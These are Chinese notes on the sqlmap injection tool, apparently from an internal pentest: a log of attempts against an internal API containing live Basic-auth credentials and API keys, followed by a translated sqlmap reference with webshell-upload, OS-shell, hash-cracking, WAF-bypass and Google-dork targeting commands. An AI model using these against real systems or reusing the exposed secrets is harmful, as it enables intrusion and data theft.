#只能使用python2.7 版本 并在sqlmap.py安装目录执行，改变Path中的环境变量可以更换python版本

#注入尝试
{

sqlmap -u “http://www.vuln.cn/post.php?id=1″

curl -v -X POST -H "Authorization:Basic c3Vic2NyaWJlcjpTc01pbmkxQA==" 'http://10.175.102.225:9580/appmgt/api/v1/?name=appTest011&quota_prod=10-100&quota_sand=10-10&redirect_url="http://www.baid1u.com"'

python sqlmap.py  –auth-type=Basic –auth-cred="Authorization:Basic c3Vic2NyaWJlcjpTc01pbmkxQA==" -u "http://10.175.102.225:9580/appmgt/api/v1/?name=appTest01&quota_prod=10-100&quota_sand=10-10&redirect_url=http://www.baidu.com" –headers "Authorization:Basic c3Vic2NyaWJlcjpTc01pbmkxQA==" --dbms PostgreSQL –level 3

python sqlmap.py -u "http://10.175.102.225:9580/appmgt/api/v1/?name=appTest01&quota_prod=10-100&quota_sand=10-10&redirect_url=http://www.baidu.com" --auth-type Basic --auth-cred "subscriber:SsMini1@" --headers "Authorization:Basic c3Vic2NyaWJlcjpTc01pbmkxQA==" --dbms PostgreSQL –level 3

python sqlmap.py -u "http://10.175.102.225:9580/appmgt/api/v1/?name=appTest01&quota_prod=10-100&quota_sand=10-10&redirect_url=http://www.baidu.com" --auth-type Basic --auth-cred "subscriber:SsMini1@" --dbms PostgreSQL –level 3

provider:Pv&89Ijn

#好像没找到注入点
python sqlmap.py -u "http://10.175.102.225:9580/appmgt/api/v1/?name=appTest01&quota_prod=10-100&quota_sand=10-10&redirect_url=http://www.baidu.com" --headers "Authorization:Basic c3Vic2NyaWJlcjpTc01pbmkxQA==" --dbms PostgreSQL –level 3

#增加信息和级别

curl -v -X POST -H "Authorization:Basic c3Vic2NyaWJlcjpTc01pbmkxQA==" 'http://10.175.102.225:9580/appmgt/api/v1/?name=appTest011&quota_prod=10-100&quota_sand=10-10&redirect_url=http://www.baid1u.com'
{"name":"appTest011","App_key":"KDYPjL8SlU6__KbZimS3fW3Pibwa","Sec_key":"CK1ohD2UQMaoZE3fLWYTbXrbLDQa"}

curl -k -v -X PUT -H "Authorization: Basic c3Vic2NyaWJlcjpTc01pbmkxQA==" 'http://10.175.102.225:9580/appmgt/api/v1/?name=appTest011&status=approved&quota_prod=60-200&quota_sand=100-80&redirect_url=http://www.baid1u.com' 

#已更新app信息为点
python sqlmap.py -u "http://10.175.102.225:9580/appmgt/api/v1/?name=appTest011&status=approved&quota_prod=60-200&quota_sand=100-80&redirect_url=http://www.baid1u.com" --headers "Authorization:Basic c3Vic2NyaWJlcjpTc01pbmkxQA==" --dbms PostgreSQL –level 5
#没找到sql注入点

#APP查询----/appmgt/api/v1/
curl -v -X GET -H "Authorization:Basic c3Vic2NyaWJlcjpTc01pbmkxQA==" 'http://10.175.102.225:9580/appmgt/api/v1/?name=appTest011'

python sqlmap.py -u "http://10.175.102.225:9580/appmgt/api/v1/?name=appTest011" --headers "Authorization:Basic c3Vic2NyaWJlcjpTc01pbmkxQA==" –level 5

#未找到

#尝试统计信息查询
curl -k -v -X GET -H "Authorization:Basic cHJvdmlkZXI6UHYmODlJam4=" -H "beginDate:2016-09-20 12:00:00" -H "endDate:2016-09-23 12:00:00" 'http://127.0.0.1:9763/rest/invoke/statistics?pageSize=1&pageIndex=2001'

python sqlmap.py -u "http://10.175.102.225:9580/rest/invoke/statistics?pageSize=1&pageIndex=2001" --headers "Authorization:Basic cHJvdmlkZXI6UHYmODlJam4=" --headers "beginDate:2016-09-20 12:00:00" --headers "endDate:2016-09-23 12:00:00" --dbms PostgreSQL –level 5

#将注入的请求都保存到lgj.log文件中
python sqlmap.py -u "http://10.175.102.225:9580/rest/invoke/statistics?pageSize=1&pageIndex=2001" --headers "Authorization:Basic cHJvdmlkZXI6UHYmODlJam4=" --dbms PostgreSQL --os Linux –level 5 -t lgj.log

#如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。共有七个等级
python sqlmap.py -u "http://10.175.102.225:9580/rest/invoke/statistics?pageSize=1&pageIndex=2001" --headers "Authorization:Basic cHJvdmlkZXI6UHYmODlJam4=" --dbms PostgreSQL --os Linux –level 5 -v 6
}

#参数列表
{

sqlmap简介

sqlmap支持五种不同的注入模式：

1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
4、联合查询注入，可以使用union的情况下的注入。
5、堆查询注入，可以同时执行多条语句的执行时的注入。
sqlmap支持的数据库有

MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB

检测注入
基本格式

sqlmap -u “http://www.vuln.cn/post.php?id=1″

默认使用level1检测全部数据库类型

sqlmap -u “http://www.vuln.cn/post.php?id=1″ –dbms mysql –level 3

指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）

跟随302跳转

当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，
当注入错误的时候，先报错再跳转的时候，不需要跟随302。
目的就是：要追踪到错误信息。

cookie注入

当程序有防get注入的时候，可以使用cookie注入
sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11″ –level 2（只有level达到2才会检测cookie）

从post数据包中注入

可以使用burpsuite或者temperdata等工具来抓取post包

sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql 指定username参数

注入成功后
获取数据库基本信息

sqlmap -u “http://www.vuln.cn/post.php?id=1″ –dbms mysql –level 3 –dbs

查询有哪些数据库

sqlmap -u “http://www.vuln.cn/post.php?id=1″ –dbms mysql –level 3 -D test –tables

查询test数据库中有哪些表

sqlmap -u “http://www.vuln.cn/post.php?id=1″ –dbms mysql –level 3 -D test -T admin –columns

查询test数据库中admin表有哪些字段

sqlmap -u “http://www.vuln.cn/post.php?id=1″ –dbms mysql –level 3 -D test -T admin -C “username,password” –dump

dump出字段username与password中的数据

其他命令参考下面

从数据库中搜索字段

sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password
在dedecms数据库中搜索字段admin或者password。

读取与写入文件

首先找需要网站的物理路径，其次需要有可写或可读权限。

–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）
–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
#示例：
sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”

使用shell命令：

sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell
接下来指定网站可写目录：
“E:\php\htdocs\dvwa”

#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）

sqlmap详细命令：
–is-dba 当前用户权限（是否为root权限）
–dbs 所有数据库
–current-db 网站当前数据库
–users 所有数据库用户
–current-user 当前数据库用户
–random-agent 构造随机user-agent
–passwords 数据库密码
–proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理
–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
——————————————————————————————————

Options（选项）：

–version 显示程序的版本号并退出
-h, –help 显示此帮助消息并退出
-v VERBOSE 详细级别：0-6（默认为1）
Target（目标）：

以下至少需要设置其中一个选项，设置目标URL。

-d DIRECT 直接连接到数据库。
-u URL, –url=URL 目标URL。
-l LIST 从Burp或WebScarab代理的日志中解析目标。
-r REQUESTFILE 从一个文件中载入HTTP请求。
-g GOOGLEDORK 处理Google dork的结果作为目标URL。
-c CONFIGFILE 从INI配置文件中加载选项。
Request（请求）：

这些选项可以用来指定如何连接到目标URL。

–data=DATA 通过POST发送的数据字符串
–cookie=COOKIE HTTP Cookie头
–cookie-urlencode URL 编码生成的cookie注入
–drop-set-cookie 忽略响应的Set – Cookie头信息
–user-agent=AGENT 指定 HTTP User – Agent头
–random-agent 使用随机选定的HTTP User – Agent头
–referer=REFERER 指定 HTTP Referer头
–headers=HEADERS 换行分开，加入其他的HTTP头
–auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
–auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
–auth-cert=ACERT HTTP认证证书（key_file，cert_file）
–proxy=PROXY 使用HTTP代理连接到目标URL
–proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
–ignore-proxy 忽略系统默认的HTTP代理
–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
–timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
–retries=RETRIES 连接超时后重新连接的时间（默认3）
–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
–safe-url=SAFURL 在测试过程中经常访问的url地址
–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL
Enumeration（枚举）：

这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行
您自己的SQL语句。

-b, –banner 检索数据库管理系统的标识
–current-user 检索数据库管理系统当前用户
–current-db 检索数据库管理系统当前数据库
–is-dba 检测DBMS当前用户是否DBA
–users 枚举数据库管理系统用户
–passwords 枚举数据库管理系统用户密码哈希
–privileges 枚举数据库管理系统用户的权限
–roles 枚举数据库管理系统用户的角色
–dbs 枚举数据库管理系统数据库
-D DBname 要进行枚举的指定数据库名
-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）
–tables 枚举的DBMS数据库中的表
–columns 枚举DBMS数据库表列
–dump 转储数据库管理系统的数据库中的表项
–dump-all 转储所有的DBMS数据库表中的条目
–search 搜索列（S），表（S）和/或数据库名称（S）
-C COL 要进行枚举的数据库列
-U USER 用来进行枚举的数据库用户
–exclude-sysdbs 枚举表时排除系统数据库
–start=LIMITSTART 第一个查询输出进入检索
–stop=LIMITSTOP 最后查询的输出进入检索
–first=FIRSTCHAR 第一个查询输出字的字符检索
–last=LASTCHAR 最后查询的输出字字符检索
–sql-query=QUERY 要执行的SQL语句
–sql-shell 提示交互式SQL的shell
Optimization（优化）：

这些选项可用于优化SqlMap的性能。

-o 开启所有优化开关
–predict-output 预测常见的查询输出
–keep-alive 使用持久的HTTP（S）连接
–null-connection 从没有实际的HTTP响应体中检索页面长度
–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）
Injection（注入）：

这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。

-p TESTPARAMETER 可测试的参数（S）
–dbms=DBMS 强制后端的DBMS为此值
–os=OS 强制后端的DBMS操作系统为这个值
–prefix=PREFIX 注入payload字符串前缀
–suffix=SUFFIX 注入payload字符串后缀
–tamper=TAMPER 使用给定的脚本（S）篡改注入数据
Detection（检测）：

这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。

–level=LEVEL 执行测试的等级（1-5，默认为1）
–risk=RISK 执行测试的风险（0-3，默认为1）
–string=STRING 查询时有效时在页面匹配字符串
–regexp=REGEXP 查询时有效时在页面匹配正则表达式
–text-only 仅基于在文本内容比较网页
Techniques（技巧）：

这些选项可用于调整具体的SQL注入测试。

–technique=TECH SQL注入技术测试（默认BEUST）
–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
–union-cols=UCOLS 定列范围用于测试UNION查询注入
–union-char=UCHAR 用于暴力猜解列数的字符
Fingerprint（指纹）：

-f, –fingerprint 执行检查广泛的DBMS版本指纹
Brute force（蛮力）：

这些选项可以被用来运行蛮力检查。

–common-tables 检查存在共同表
–common-columns 检查存在共同列
User-defined function injection（用户自定义函数注入）：
这些选项可以用来创建用户自定义函数。

–udf-inject 注入用户自定义函数
–shared-lib=SHLIB 共享库的本地路径

File system access（访问文件系统）：

这些选项可以被用来访问后端数据库管理系统的底层文件系统。

–file-read=RFILE 从后端的数据库管理系统文件系统读取文件
–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
Operating system access（操作系统访问）：

这些选项可以用于访问后端数据库管理系统的底层操作系统。

–os-cmd=OSCMD 执行操作系统命令
–os-shell 交互式的操作系统的shell
–os-pwn 获取一个OOB shell，meterpreter或VNC
–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
–os-bof 存储过程缓冲区溢出利用
–priv-esc 数据库进程用户权限提升
–msf-path=MSFPATH Metasploit Framework本地的安装路径
–tmp-path=TMPPATH 远程临时文件目录的绝对路径
Windows注册表访问：

这些选项可以被用来访问后端数据库管理系统Windows注册表。

–reg-read 读一个Windows注册表项值
–reg-add 写一个Windows注册表项值数据
–reg-del 删除Windows注册表键值
–reg-key=REGKEY Windows注册表键
–reg-value=REGVAL Windows注册表项值
–reg-data=REGDATA Windows注册表键值数据
–reg-type=REGTYPE Windows注册表项值类型
这些选项可以用来设置一些一般的工作参数。

-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
-s SESSIONFILE 保存和恢复检索会话文件的所有数据
–flush-session 刷新当前目标的会话文件
–fresh-queries 忽略在会话文件中存储的查询结果
–eta 显示每个输出的预计到达时间
–update 更新SqlMap
–save file保存选项到INI配置文件
–batch 从不询问用户输入，使用所有默认配置。
Miscellaneous（杂项）：

–beep 发现SQL注入时提醒
–check-payload IDS对注入payloads的检测测试
–cleanup SqlMap具体的UDF和表清理DBMS
–forms 对目标URL的解析和测试形式
–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
–page-rank Google dork结果显示网页排名（PR）
–parse-errors 从响应页面解析数据库管理系统的错误消息
–replicate 复制转储的数据到一个sqlite3数据库
–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
–wizard 给初级用户的简单向导界面
}

#部分实例
{

http://192.168.136.131/sqlmap/mysql/get_int.php?id=1

当给sqlmap这么一个url的时候，它会：

1、判断可注入的参数

2、判断可以用那种SQL注入技术来注入

3、识别出哪种数据库

4、根据用户选择，读取哪些数据

sqlmap支持五种不同的注入模式：

1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。

2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。

3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。

4、联合查询注入，可以使用union的情况下的注入。

5、堆查询注入，可以同时执行多条语句的执行时的注入。

sqlmap支持的数据库有：

MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB

可以提供一个简单的URL，Burp或WebScarab请求日志文件，文本文档中的完整http请求或者Google的搜索，匹配出结果页面，也可以自己定义一个正则来判断那个地址去测试。

测试GET参数，POST参数，HTTP Cookie参数，HTTP User-Agent头和HTTP Referer头来确认是否有SQL注入，它也可以指定用逗号分隔的列表的具体参数来测试。

可以设定HTTP(S)请求的并发数，来提高盲注时的效率。

Youtube上有人做的使用sqlmap的视频：

http://www.youtube.com/user/inquisb/videos

http://www.youtube.com/user/stamparm/videos

使用sqlmap的实例文章：

http://unconciousmind.blogspot.com/search/label/sqlmap

可以点击https://github.com/sqlmapproject/sqlmap/tarball/master下载最新版本sqlmap。

也可以使用git来获取sqlmap

git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

之后可以直接使用命令来更新

python sqlmap.py --update

或者

git pull

更新sqlmap

如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。

共有七个等级，默认为1：

0、只显示python错误以及严重的信息。

1、同时显示基本信息和警告信息。（默认）

2、同时显示debug信息。

3、同时显示注入的payload。

4、同时显示HTTP请求。

5、同时显示HTTP响应头。

6、同时显示HTTP响应页面。

如果你想看到sqlmap发送的测试payload最好的等级就是3。
获取目标方式
目标URL

参数：-u或者--url

格式：http(s)://targeturl[:port]/[…]

例如：python sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users

从Burp或者WebScarab代理中获取日志

参数：-l

可以直接吧Burp proxy或者WebScarab proxy中的日志直接倒出来交给sqlmap来一个一个检测是否有注入。
从文本中获取多个目标扫描

参数：-m

文件中保存url格式如下，sqlmap会一个一个检测

www.target1.com/vuln1.php?q=foobar

www.target2.com/vuln2.asp?id=1

www.target3.com/vuln3/id/1*

从文件中加载HTTP请求

参数：-r

sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。

比如文本文件内如下：

POST /vuln.php HTTP/1.1
Host: www.target.com
User-Agent: Mozilla/4.0

id=1

当请求是HTTPS的时候你需要配合这个--force-ssl参数来使用，或者你可以在Host头后门加上:443
处理Google的搜索结果

参数：-g

sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。

例子：

python sqlmap.py -g "inurl:\".php?id=1\""

（很牛B的功能，测试了一下，第十几个就找到新浪的一个注入点）

此外可以使用-c参数加载sqlmap.conf文件里面的相关配置。
请求
http数据

参数：--data

此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。

例子：

python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banner --dbs --users

参数拆分字符

参数：--param-del

当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。

例子：

python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";" -f --banner --dbs --users

HTTP cookie头

参数：--cookie,--load-cookies,--drop-set-cookie

这个参数在以下两个方面很有用：

1、web应用需要登陆的时候。

2、你想要在这些头参数中测试SQL注入时。

可以通过抓包把cookie获取到，复制出来，然后加到--cookie参数里。

在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。

如果你不想接受Set-Cookie可以使用--drop-set-cookie参数来拒接。

当你使用--cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当--level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。
HTTP User-Agent头

参数：--user-agent,--random-agent

默认情况下sqlmap的HTTP请求头中User-Agent值是：

sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)

可以使用--user-anget参数来修改，同时也可以使用--random-agnet参数来随机的从./txt/user-agents.txt中获取。

当--level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。
HTTP Referer头

参数：--referer

sqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。
额外的HTTP头

参数：--headers

可以通过--headers参数来增加额外的http头
HTTP认证保护

参数：--auth-type,--auth-cred

这些参数可以用来登陆HTTP的认证保护支持三种方式：

1、Basic

2、Digest

3、NTLM

例子：

python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"

HTTP协议的证书认证

参数：--auth-cert

当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file。

key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。
HTTP(S)代理

参数：--proxy,--proxy-cred和--ignore-proxy

使用--proxy代理是格式为：http://url:port。

当HTTP(S)代理需要认证是可以使用--proxy-cred参数：username:password。

--ignore-proxy拒绝使用本地局域网的HTTP(S)代理。
HTTP请求延迟

参数：--delay

可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。
设定超时时间

参数：--timeout

可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。
设定重试超时

参数：--retries

当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。
设定随机改变的参数值

参数：--randomize

可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。
利用正则过滤目标网址

参数：--scope

例如：

python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"

避免过多的错误请求被屏蔽

参数：--safe-url,--safe-freq

有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。

绕过这个策略有两种方式：

1、--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。
2、--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。

关掉URL参数值编码

参数：--skip-urlencode

根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过URL编码的值，这时候就需要用--skip-urlencode参数。
每次请求时候执行自定义的python代码

参数：--eval

在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval参数在每次请求时根据所写python代码做完修改后请求。

例子：

python sqlmap.py -u "http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"

上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。
注入
测试参数

参数：-p,--skip

sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p "id,user-anget"

当你使用--level的值很大但是有个别参数不想测试的时候可以使用--skip参数。

例如：--skip="user-angent.referer"

在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*

例如：

python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"

sqlmap将会测试value1的位置是否可注入。
指定数据库

参数：--dbms

默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有：

MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2

指定数据库服务器系统

参数：--os

默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。
指定无效的大数字

参数：--invalid-bignum

当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错。
只定无效的逻辑

参数：--invalid-logical

原因同上，可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19。
注入payload

参数：--prefix,--suffix

在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。

例如，代码中是这样调用数据库的：

$query = "SELECT * FROM users WHERE id=(’" . $_GET[’id’] . "’) LIMIT 0, 1"; 

这时你就需要--prefix和--suffix参数了：

python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "’)" --suffix "AND (’abc’=’abc"

这样执行的SQL语句变成：

$query = "SELECT * FROM users WHERE id=(’1’) <PAYLOAD> AND (’abc’=’abc’) LIMIT 0, 1"; 

修改注入的数据

参数：--tamper

sqlmap除了使用CHAR()函数来防止出现单引号之外没有对注入的数据修改，你可以使用--tamper参数对数据做修改来绕过WAF等设备。

下面是一个tamper脚本的格式：

# Needed imports
from lib.core.enums import PRIORITY
# Define which is the order of application of tamper scripts against
# the payload
__priority__ = PRIORITY.NORMAL
def tamper(payload):
    '''
    Description of your tamper script
    '''
    retVal = payload
    # your code to tamper the original payload
    # return the tampered payload
    return retVal

可以查看 tamper/ 目录下的有哪些可用的脚本

例如：

$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3

[hh:mm:03] [DEBUG] cleaning up configuration parameters
[hh:mm:03] [INFO] loading tamper script 'between'
[hh:mm:03] [INFO] loading tamper script 'randomcase'
[hh:mm:03] [INFO] loading tamper script 'space2comment'
[...]
[hh:mm:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092
[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057
[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041
[...]
[hh:mm:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONCAT(cHar(
58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/**/elsE/**/0/**/
ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/information_schema.tables/**/
group/**/bY/**/x)a)
[hh:mm:04] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING
clause' injectable
[...]

探测
探测等级

参数：--level

共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。

这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。

总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。
风险等级

参数：--risk

共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。

在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。

测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。
页面比较

参数：--string,--not-string,--regexp,--code

默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用--string参数添加字符串，--regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（--not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数--code=200。

参数：--text-only,--titles

有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用--text-only（HTTP响应体中不同）--titles（HTML的title标签中不同）。
注入技术
测试是否是注入

参数：--technique

这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。

支持的探测方式如下：

B: Boolean-based blind SQL injection（布尔型注入）
E: Error-based SQL injection（报错型注入）
U: UNION query SQL injection（可联合查询注入）
S: Stacked queries SQL injection（可多语句查询注入）
T: Time-based blind SQL injection（基于时间延迟注入）

设定延迟注入的时间

参数：--time-sec

当使用继续时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒。
设定UNION查询字段数

参数：--union-cols

默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候他会增加测试到50个字段数。设定--union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。
设定UNION查询使用的字符

参数：--union-char

默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用--union-char只定UNION查询的字符。
二阶SQL注入

参数：--second-order

有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。--second-order后门跟一个判断页面的URL地址。
列数据
标志

参数：-b,--banner

大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。
用户

参数：-current-user

在大多数据库中可以获取到管理数据的用户。
当前数据库

参数：--current-db

返还当前连接的数据库。
当前用户是否为管理用

参数：--is-dba

判断当前的用户是否为管理，是的话会返回True。
列数据库管理用户

参数：--users

当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。
列出并破解数据库用户的hash

参数：--passwords

当前用户有权限读取包含用户密码的彪的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。

例子：

$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --passwords -v 1
[...]
back-end DBMS: PostgreSQL
[hh:mm:38] [INFO] fetching database users password hashes
do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y
[hh:mm:42] [INFO] using hash method: 'postgres_passwd'
what's the dictionary's location? [/software/sqlmap/txt/wordlist.txt]
[hh:mm:46] [INFO] loading dictionary from: '/software/sqlmap/txt/wordlist.txt'
do you want to use common password suffixes? (slow!) [y/N] n
[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)
[hh:mm:49] [INFO] found: 'testpass' for user: 'testuser'
[hh:mm:50] [INFO] found: 'testpass' for user: 'postgres'
database management system users password hashes:
[*] postgres [1]:
    password hash: md5d7d880f96044b72d0bba108ace96d1e4
    clear-text password: testpass
[*] testuser [1]:
    password hash: md599e5ea7a6f7c3269995cba3927fd0093
    clear-text password: testpass

可以看到sqlmap不仅勒出数据库的用户跟密码，同时也识别出是PostgreSQL数据库，并询问用户是否采用字典爆破的方式进行破解，这个爆破已经支持Oracle和Microsoft SQL Server。

也可以提供-U参数来指定爆破哪个用户的hash。
列出数据库管理员权限

参数：--privileges

当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。
列出数据库管理员角色

参数：--roles

当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。

仅适用于当前数据库是Oracle的时候。
列出数据库系统的数据库

参数：--dbs

当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。
列举数据库表

参数：--tables,--exclude-sysdbs,-D

当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。

如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。

--exclude-sysdbs参数是指包含了所有的系统数据库。

需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。
列举数据库表中的字段

参数：--columns,-C,-T,-D

